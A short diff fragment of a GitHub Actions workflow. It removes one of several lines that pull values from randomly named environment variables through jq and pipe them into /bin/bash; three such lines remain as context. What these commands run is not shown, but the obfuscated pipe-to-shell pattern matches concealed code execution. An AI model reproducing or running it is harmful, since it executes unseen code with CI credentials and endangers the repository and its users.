@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$yvyu3333" | jq -r .qyc557 | /bin/bash
           echo $p74 | jq -r .x8 | /bin/bash
           echo $opaz84 | jq -r .cakug2944 | /bin/bash
-          printf '%s' "$njlu58176" | jq -r .dno947 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
